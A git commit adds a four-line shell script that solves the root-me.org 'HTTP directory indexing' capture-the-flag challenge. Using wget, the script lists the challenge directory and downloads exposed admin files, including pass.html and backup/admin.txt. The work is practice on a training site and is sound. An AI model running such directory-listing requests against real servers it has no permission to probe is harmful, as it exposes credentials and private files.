32d41fa33beefe5c8bbb3eb1980deb00fc466c1a
anomen <ludek.h@gmail.com>
2015-07-08 15:54:14 +0200

    root-me.org/Web-Server/HTTP-directory-indexing

---
+++ root-me.org/Web-Server/HTTP-directory-indexing/run.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+wget http://challenge01.root-me.org/web-serveur/ch4/
+wget http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html
+
+wget http://challenge01.root-me.org/web-serveur/ch4/admin/
+wget http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt
